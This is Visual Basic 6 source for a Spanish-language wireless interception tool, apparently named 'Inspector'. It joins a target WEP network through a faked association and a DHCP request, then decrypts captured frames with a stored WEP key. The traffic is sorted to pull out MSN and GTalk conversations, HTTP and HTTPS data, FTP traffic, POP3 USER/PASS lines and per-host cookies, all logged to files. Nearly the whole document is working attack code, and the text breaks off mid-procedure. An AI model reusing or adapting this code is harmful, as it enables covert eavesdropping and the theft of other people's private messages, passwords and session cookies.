VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frm_watcher 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Inspector"
   ClientHeight    =   8700
   ClientLeft      =   3510
   ClientTop       =   2580
   ClientWidth     =   12780
   Icon            =   "frm_watcher.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   8700
   ScaleWidth      =   12780
   Begin VB.CommandButton Command1 
      Caption         =   "Conseguir IP"
      Height          =   315
      Left            =   4680
      TabIndex        =   32
      Top             =   8280
      Width           =   1335
   End
   Begin VB.TextBox t_IP 
      Alignment       =   2  'Center
      Height          =   285
      Left            =   3120
      TabIndex        =   31
      Top             =   8280
      Width           =   1335
   End
   Begin VB.CommandButton pb_DHCP 
      Caption         =   "Conseguir IP"
      Enabled         =   0   'False
      Height          =   315
      Left            =   1560
      TabIndex        =   30
      Top             =   8280
      Width           =   1335
   End
   Begin VB.CommandButton pb_asociar 
      Caption         =   "Asociar"
      Height          =   315
      Left            =   120
      TabIndex        =   29
      Top             =   8280
      Width           =   1335
   End
   Begin VB.CheckBox ch_resolver 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "Resolver automáticamente direcciones de Hosts "
      Height          =   220
      Left            =   8280
      TabIndex        =   28
      ToolTipText     =   $"frm_watcher.frx":058A
      Top             =   5400
      Visible         =   0   'False
      Width           =   3735
   End
   Begin VB.Timer Timer1 
      Interval        =   250
      Left            =   240
      Top             =   8640
   End
   Begin VB.ListBox lst_urls 
      Height          =   2595
      Left            =   120
      TabIndex        =   13
      Top             =   5640
      Width           =   11775
   End
   Begin VB.ListBox lst_msn 
      Height          =   1815
      Left            =   120
      TabIndex        =   12
      Top             =   3480
      Width           =   11775
   End
   Begin VB.CommandButton pb_control 
      Caption         =   "Pausa"
      Height          =   255
      Left            =   10200
      TabIndex        =   11
      Top             =   840
      Width           =   1695
   End
   Begin VB.TextBox t_wep 
      Alignment       =   2  'Center
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   11.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   375
      Left            =   6000
      TabIndex        =   10
      Top             =   385
      Width           =   2055
   End
   Begin VB.ListBox lst_estaciones 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1740
      Left            =   8160
      TabIndex        =   8
      Top             =   1440
      Width           =   4095
   End
   Begin VB.ListBox lst_pak 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1740
      Left            =   120
      TabIndex        =   6
      Top             =   1440
      Width           =   7935
   End
   Begin MSWinsockLib.Winsock ws01 
      Left            =   15840
      Top             =   8760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Información HTTP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   8
      Left            =   120
      TabIndex        =   27
      Top             =   5400
      Width           =   3255
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Conversaciones MSN Messenger"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   7
      Left            =   120
      TabIndex        =   26
      Top             =   3240
      Width           =   3135
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Log, información y paquetes con información comprometida (FTP, POP3, etc)"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   6
      Left            =   120
      TabIndex        =   25
      Top             =   1200
      Width           =   7935
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Direcciones físicas:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   5
      Left            =   8160
      TabIndex        =   24
      Top             =   1200
      Width           =   1935
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   9
      Left            =   9000
      TabIndex        =   23
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   8
      Left            =   8040
      TabIndex        =   22
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   7
      Left            =   7080
      TabIndex        =   21
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Otro"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   6
      Left            =   6120
      TabIndex        =   20
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "POP3"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   5
      Left            =   5160
      TabIndex        =   19
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "MSN"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   4
      Left            =   4200
      TabIndex        =   18
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "HTTP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   3
      Left            =   3240
      TabIndex        =   17
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Otro"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   2
      Left            =   2280
      TabIndex        =   16
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "UDP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   1
      Left            =   1320
      TabIndex        =   15
      Top             =   840
      Width           =   855
   End
   Begin VB.Label l_disp 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "TCP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000040&
      Height          =   255
      Index           =   0
      Left            =   360
      TabIndex        =   14
      Top             =   840
      Width           =   855
   End
   Begin VB.Shape Shape2 
      BackColor       =   &H00000000&
      BackStyle       =   1  'Opaque
      Height          =   255
      Left            =   120
      Top             =   840
      Width           =   9975
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Clave WEP:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   0
      Left            =   6000
      TabIndex        =   9
      Top             =   120
      Width           =   1095
   End
   Begin VB.Shape sh_senal 
      BackColor       =   &H00FF0000&
      BackStyle       =   1  'Opaque
      Height          =   135
      Left            =   840
      Top             =   480
      Width           =   5055
   End
   Begin VB.Shape Shape1 
      Height          =   255
      Left            =   840
      Top             =   420
      Width           =   5055
   End
   Begin VB.Label Label1 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "Señal:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   3
      Left            =   -240
      TabIndex        =   7
      Top             =   480
      Width           =   975
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Canal:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   1
      Left            =   3120
      TabIndex        =   5
      Top             =   120
      Width           =   615
   End
   Begin VB.Label l_canal 
      BackColor       =   &H00FFFFFF&
      Caption         =   "XX"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   3720
      TabIndex        =   4
      Top             =   120
      Width           =   375
   End
   Begin VB.Label l_essid 
      BackColor       =   &H00FFFFFF&
      Caption         =   "WLAN_XX"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   4920
      TabIndex        =   3
      Top             =   120
      Width           =   1095
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "ESSID:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   4
      Left            =   4200
      TabIndex        =   2
      Top             =   120
      Width           =   735
   End
   Begin VB.Label l_bssid 
      BackColor       =   &H00FFFFFF&
      Caption         =   "00:00:00:00:00:00"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   840
      TabIndex        =   1
      Top             =   120
      Width           =   2175
   End
   Begin VB.Label Label1 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "BSSID:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   2
      Left            =   -240
      TabIndex        =   0
      Top             =   120
      Width           =   975
   End
End
Attribute VB_Name = "frm_watcher"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim bssid As String
Dim ESSID As String
Dim lMAC As String
Dim Canal As Integer
Dim WBeacon As Boolean
Dim dBeacon As String
Dim dChallenge As String
Dim dAnswer As String
Dim dAssoc As String
Dim Buscando As Boolean
Dim ClaveEnc As String
Dim CurClave As String
Dim BalizaGuardada As Boolean
Dim NoProcesar As Boolean
Const maxw = 5055
Dim activada As Boolean
Dim paquetes(0 To 999) As String
Dim pct As Integer
Dim fLog As Integer
Dim fMSN As Integer
Dim fHTTP As Integer
Dim fHTTPS As Integer
Dim fMACs As Integer
Dim DirCookies As String
Dim UMSN As String
Dim IPLocal As String
Dim IPAP As String
Dim IPDNS1 As String

Private Enum DispType
   dTCP = 0
   dUDP = 1
   dOtroRed = 2
   dHTTP = 3
   dMSN = 4
   dPOP3 = 5
   dOtroProt = 6
   dDisp1 = 7
   dDisp2 = 8
   dDisp3 = 9
End Enum
Private Sub CreaTrazas()
   Dim DirSes As String
   Dim FicLog As String
   Dim FicMSN As String
   Dim FicHTTP As String
   Dim FicHTTPS As String
   Dim FicMACs As String
   On Error Resume Next
   DirSes = App.Path & "\Sesiones"
   MkDir DirSes
   DirSes = DirSes & "\Inspector"
   MkDir DirSes
   DirSes = DirSes & "\" & gESSID & "_" & Format$(Now, "yyyymmddhhmmss")
   MkDir DirSes
   FicLog = DirSes & "\Log.txt"
   FicMSN = DirSes & "\MSN.txt"
   FicHTTP = DirSes & "\HTTP.txt"
   FicHTTPS = DirSes & "\HTTPS.txt"
   FicMACs = DirSes & "\MACS.txt"
   DirCookies = DirSes & "\Cookies"
   MkDir DirCookies
   
   fLog = FreeFile
   Open FicLog For Output As #fLog
   fMSN = FreeFile
   Open FicMSN For Output As #fMSN
   fHTTP = FreeFile
   Open FicHTTP For Output As #fHTTP
   fHTTPS = FreeFile
   Open FicHTTPS For Output As #fHTTPS
   fMACs = FreeFile
   Open FicMACs For Output As #fMACs
   
   AbrirCAP DirSes & "\WTC_" & gESSID & "_" & Format$(Now, "yyyymmddhhmmss")

End Sub
Private Sub WLog(ByVal txt As String)
   Print #fLog, Format$(Now, "dd/mm/yyyy - hh:mm:ss") & ": " & txt
End Sub
Private Sub WMSN(ByVal txt As String)
   Print #fMSN, Format$(Now, "dd/mm/yyyy - hh:mm:ss") & ": " & txt
End Sub
Private Sub WHTTP(ByVal txt As String)
   Print #fHTTP, Format$(Now, "dd/mm/yyyy - hh:mm:ss") & ": " & txt
End Sub
Private Sub WHTTPS(ByVal txt As String)
   Print #fHTTPS, Format$(Now, "dd/mm/yyyy - hh:mm:ss") & ": " & txt
End Sub
Private Sub WMAC(ByVal txt As String)
   Print #fMACs, Format$(Now, "dd/mm/yyyy - hh:mm:ss") & ": " & txt
End Sub
Private Sub WCookie(ByVal host As String, ByVal Cookie As String)
   Dim fCookie As Integer
   fCookie = FreeFile
   host = Replace(host, "*", "x")
   host = Replace(host, ":", "..")
   host = Replace(host, "-", "_")
   host = Replace(host, "?", "ç")
   host = Replace(host, "/", "%")
   On Error Resume Next
   Open DirCookies & "\Cookie_" & host & ".txt" For Append As #fCookie
   Print #fCookie, Cookie
   Close (fCookie)
End Sub
Private Sub MarcaSenal(ByVal senal As Integer)
      sh_senal.Width = senal / 100 * maxw
      sh_senal.Refresh
End Sub
Private Sub Log(ByVal msg As String)
  If Left$(msg, 10) = "    Data: " Then
     pct = pct + 1
     msg = Format$(pct, "000") & "." & msg
  Else
     msg = "    " & msg
  End If
  lst_pak.AddItem msg
  WLog msg
  If lst_pak.ListCount > 8 Then
     lst_pak.TopIndex = lst_pak.ListCount - 8
  End If
  lst_pak.Refresh
End Sub


Private Sub Progreso(ByVal pct As Integer)
   Dim d As Double
   d = pct / 100
   sh_progreso.Width = maxw * d
   sh_progreso.Refresh
End Sub






Private Sub Command1_Click()
   Dim a As String
   a = ARPRequest(gBSSID, gMACLocal, "FFFFFFFFFFFF", "192.168.1.100", "192.168.1.1", t_wep.Text)
   SendPacket a
End Sub


Private Sub Form_Load()
   Dim T As Long
   ws01.RemoteHost = "127.0.0.1"
   ws01.RemotePort = 666
   ws01.Connect
   T = GetTickCount()
   Do While ((GetTickCount() - T) < 3000) And ws01.State <> 7
      DoEvents
   Loop
   If ws01.State <> 7 Then
      MsgBox "No se ha podido conectar"
   End If
   l_essid.Caption = gESSID
   l_bssid.Caption = gBSSID
   l_canal.Caption = Format$(gCANAL, "00")
   lMAC = HexaASCII(Replace(gMACLocal, ":", ""))
   MarcaSenal 0
   t_wep.Text = GetSetting("WLAN_Buster", "WEP", gBSSID, "?????????????")
   CreaTrazas
   UMSN = "Usuario"
End Sub

Private Sub l_bssid_Change()
   bssid = HexaASCII(Replace(l_bssid.Caption, ":", ""))
End Sub

Private Sub l_essid_Change()
   ESSID = l_essid.Caption
End Sub



Private Sub pb_envio_Click()
    On Error Resume Next
    frm_envio.Show vbModal
End Sub


Private Sub pb_detener_Click()
   Buscando = False
End Sub

Private Sub lst_pak_Click()
   t_paquete.Text = paquetes(Val(Left$(lst_pak.Text, 3)))
End Sub

Private Sub lst_urls_DblClick()
   Clipboard.Clear
   Clipboard.SetText Mid$(lst_urls.Text, 5)
   
End Sub

Private Sub pb_asociar_Click()
   If FakeAssoc2(bssid, ESSID, gMACLocal) Then pb_DHCP.Enabled = True
End Sub

Private Sub pb_control_Click()
   If pb_control.Caption = "Pausa" Then
      pb_control.Caption = "Seguir"
      NoProcesar = True
   Else
      pb_control.Caption = "Pausa"
      NoProcesar = False
   End If
End Sub

Private Sub pb_DHCP_Click()
   Dim pak As String
   Dim ipl As String
   pak = CreaBootPC(False, gMACLocal, gBSSID, t_wep.Text)
   SendPacket pak
   Log "--> Paquete BootPC enviado"
   ipl = WaitForIP(6000)
   If ipl = "" Then
      Log "(!) No se ha conseguido un IP"
   Else
      Log "(i) IP Asignada: " & ip(IPLocal) & " - IP Router: " & ip(IPAP)
      t_IP.Text = ip(IPLocal)
   End If
End Sub

Private Sub Timer1_Timer()
    Dim n As Integer
    For n = 0 To l_disp.Count - 1
        l_disp(n).ForeColor = RojoOscuro
    Next n
End Sub
Private Sub Display(ByVal Piloto As Integer, ByVal txt As String)
    l_disp(Piloto).ForeColor = RojoClaro
    l_disp(Piloto).ToolTipText = txt
End Sub

Private Sub ws01_DataArrival(ByVal bytesTotal As Long)
   Dim a As String
   ws01.GetData a
   Procesa a
End Sub

Private Sub Procesa(ByVal a As String)
   Dim n As Long
   Dim p As String
   Static b As String
   Dim header As String
   Dim Payload As String
   Dim lpayload As Long
   b = b & a
   Do
       header = Left$(b, 5)
       If Len(header) < 5 Then Exit Do
       lpayload = Asc(Mid$(b, 5, 1)) + (256 * Asc(Mid$(b, 4, 1)))
       Payload = Mid$(b, 6, lpayload)
       b = Mid$(b, lpayload + 5 + 1)
               
       ProcesaPaquete header, Payload
       
       DoEvents
   Loop
End Sub
Private Sub ProcesaPaquete(ByVal HDR As String, ByVal PLD As String)
   Static np As Long
   Dim pwr As Integer
   Dim frmctr As TPE_FrameControl
   Dim pckdMAC As String
   Dim pcksMAC As String
   Dim pckBSSID As String
   Dim sIP As String
   Dim dIP As String
   Dim sPort As Long
   Dim dPort As Long
   Dim pl1 As Long
   Dim pl2 As Long
   Dim RutaPack As String
   Static Ultimo As String
   Dim Actual As String
   Dim DHCPData As String
   Dim iDHCPData As Integer
   Dim jDHCPData As Integer
   Dim lDHCPData As Integer
   np = np + 1
   pwr = Asc(Left$(PLD, 1))
   
   Select Case Asc(Left$(HDR, 1))
      Case 7 'Respuesta a petición de MAC Local
         l_macl = ASCIIHexa2(PLD)
         Command2.Enabled = True
      Case 5 'Paquete
         PLD = Mid$(PLD, 29)
         SetFrameControl Left$(PLD, 2), frmctr
         If frmctr.ToDS = False And frmctr.FromDS = False Then
            pckdMAC = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckBSSID = Mid$(PLD, 17, 6)
         ElseIf frmctr.ToDS = False And frmctr.FromDS = True Then
            pckdMAC = Mid$(PLD, 5, 6)
            pckBSSID = Mid$(PLD, 11, 6)
            pcksMAC = Mid$(PLD, 17, 6)
         ElseIf frmctr.ToDS = True And frmctr.FromDS = False Then
            pckBSSID = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckdMAC = Mid$(PLD, 17, 6)
         ElseIf frmctr.ToDS = True And frmctr.FromDS = True Then 'No sabemos como asignar, asi que dejamos como caso primero
            pckdMAC = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckBSSID = Mid$(PLD, 17, 6)
         End If
         
         If NoProcesar And (frmctr.Type <> PCK_TYPE.Management Or frmctr.Subtype <> PCK_SUBTYPE.mgmt_Beacon) Then Exit Sub
         
         If pckBSSID = bssid Then
             Select Case frmctr.Type
                    Case PCK_TYPE.Management
                         Select Case frmctr.Subtype
                                Case PCK_SUBTYPE.mgmt_Beacon         'BALIZA
                                     MarcaSenal pwr
                                     dBeacon = PLD
                                Case PCK_SUBTYPE.mgmt_AssocResponse  'ASOCIACION
                                     'AñadeEstacion MAC(pckdMAC), "?"
                                     Log "Associat: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                     If MAC(pckdMAC) = gMACLocal Then
                                        dAssoc = PLD
                                     End If
                                Case PCK_SUBTYPE.mgmt_Authentication 'CHALLENGE
                                     Log "Authenti: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                     If MAC(pckdMAC) = gMACLocal Then
                                        dChallenge = PLD
                                     End If
                                Case PCK_SUBTYPE.mgmt_AssocRequest
                                     Log "AssocReq: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ATIM
                                     Log "    ATIM: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_Deauthentication
                                     Log "Deauthen: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_Disassociation
                                     Log "Disassoc: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ProbeRequest
                                '     Log "ProbeReq: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ProbeResponse
                                '     Log "ProbeRes: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ReAssocRequest
                                     Log "ReAssReq: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ReAssocResponse
                                     Log "ReAssRes: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                         
                         End Select
                    
                    Case PCK_TYPE.data
                         'EscribeCAP PLD

                         Select Case frmctr.Subtype
                                Case PCK_SUBTYPE.data_NullData
                   '''                  Log "NullData: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                     'AñadeEstacion MAC(pckdMAC)
                                Case PCK_SUBTYPE.data_Data
                                     'Log "    Data: " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                                     Actual = Right$(PLD, 4)
                                     If Ultimo = Actual Then
                                        Exit Sub
                                      End If
                                     Ultimo = Actual
                                     
                                     PLD = Mid$(PLD, 25)
                                     paquetes(pct) = Desencripta(PLD, t_wep.Text)
                                     EscribeCAP PLD
                                     PLD = paquetes(pct)
                                     Select Case ASCIIHexa(Mid$(PLD, 7, 2)) 'Protocolo 1
                                         Case "0800" 'IP
                                              sIP = ip(Mid$(PLD, 21, 4))
                                              dIP = ip(Mid$(PLD, 25, 4))
                                              pl1 = Asc(Mid$(PLD, 29, 1))
                                              pl2 = Asc(Mid$(PLD, 31, 1))
                                              sPort = (pl1 * 256) + Asc(Mid$(PLD, 30, 1))
                                              dPort = (pl2 * 256) + Asc(Mid$(PLD, 32, 1))
                                              RutaPack = sIP & ":" & sPort & "-->" & dIP & ":" & dPort
                                              If frmctr.ToDS = False And frmctr.FromDS = True Then
                                                 AñadeEstacion MAC(pckdMAC), dIP
                                              'ElseIf frmctr.ToDS = True And frmctr.FromDS = False Then
                                              '   AñadeEstacion MAC(pckdMAC), dIP
                                              End If
                                              Select Case Asc(Mid$(PLD, 18)) 'Protocolo 2
                                                     Case 1 'ICMP
                                                     
                                                     Case 6 'TCP
                                                         
                                                           Display DispType.dTCP, RutaPack
                   '''                                       Log "     TCP: " & sIP & "(" & sPort & ") ---> " & dIP & "(" & dPort & ")"
                                                          
                                                          'MSN Messenger 1863
                                                          If sPort = 1863 Or dPort = 1863 Then
                                                             Display DispType.dMSN, ""
                                                             

                                                                Messenger Mid$(PLD, 1)

                                                          End If
                                                          'HTTP 80
                                                          If dPort = 80 Then
                                                             Display DispType.dHTTP, ""
                                                             HTTP PLD
                                                             'Cookie dIP, PLD
                                                          End If
                                                          
                                                          'HTTPS 443
                                                          If dPort = 443 Then
                                                             HTTPS PLD
                                                             'Cookie dIP, PLD
                                                          End If
                                                          
                                                          'FTP 21
                                                          If dPort = 21 Then
                                                             FTP PLD
                                                          End If
                                                          
                                                          '110 POP
                                                          If dPort = 110 Then
                                                             Display DispType.dPOP3, ""
                                                             If InStr(PLD, "USER") > 0 Or InStr(PLD, "PASS") > 0 Then
                                                                POP PLD
                                                             End If
                                                          End If
                                                          
                                                          '5222 GTALK
                                                          If dPort = 5222 Then
                                                             GTalk PLD
                                                          End If
                                                          
                                                          'Debug.Print dPort
                                                     Case 17 'UDP
                                                          Display DispType.dUDP, RutaPack
                                                          
                                                          'Respuesta DHCP
                                                          If dPort = 68 Then
                                                             If Mid$(PLD, 65, 6) = lMAC Then
                                                                IPLocal = Mid$(PLD, 53, 4) 'IP asignada por servidor DHCP
                                                                DHCPData = Mid$(PLD, 273)
                                                                iDHCPData = 5 'Saltamos la Magic Cookie
                                                                Do
                                                                   jDHCPData = Asc(Mid$(DHCPData, iDHCPData, 1)) 'Tipo de dato
                                                                   lDHCPData = Asc(Mid$(DHCPData, iDHCPData + 1, 1)) 'Longitud del dato
                                                                   Select Case DecHex(jDHCPData)
                                                                      Case "03" 'Dirección servidor
                                                                         IPAP = Mid$(DHCPData, iDHCPData + 2, 4)
                                                                      Case "06" 'Dirección DNS
                                                                         IPDNS1 = Mid$(DHCPData, iDHCPData + 2, 4)
                                                                   End Select
                                                                   iDHCPData = iDHCPData + 2 + lDHCPData
                                                                   If iDHCPData >= Len(DHCPData) Then Exit Do
                                                                Loop
                                                             End If
                                                             'Log "UDP: " & MAC(pcksMAC) & " - " & MAC(pckdMAC) & " sP:" & sPort & " dP:" & dPort
                                                             'Debug.Print ASCIIHexa2(PLD)
                                                             'Debug.Print ip(IPLocal) & " - " & ip(IPAP) & " - " & ip(IPDNS1)
                                                          End If
                                                     
                                                          'Petición DNS
                                                          
                                                     Case Else
                                                          Display DispType.dOtroProt, "[" & Asc(Mid$(PLD, 18)) & "] " & RutaPack
                                              End Select
                                         Case "0806"
                                              Display DispType.dOtroRed, ASCIIHexa(Mid$(PLD, 7, 2)) & " (ARP)"
                                              'Log "Recibido paquete ARP"
                                         Case Else
                                              Display DispType.dOtroRed, ASCIIHexa(Mid$(PLD, 7, 2))
                                              'Log "Protocolo : " & ASCIIHexa(Mid$(PLD, 15, 2))
                                     End Select
                                Case Else
                                     'Log "DT(ST" & Format$(frmctr.Subtype, "00") & "): " & MAC(pcksMAC) & " - (" & MAC(pckBSSID) & ") - " & MAC(pckdMAC)
                         End Select
    '                Case PCK_TYPE.Control
                
             End Select
          
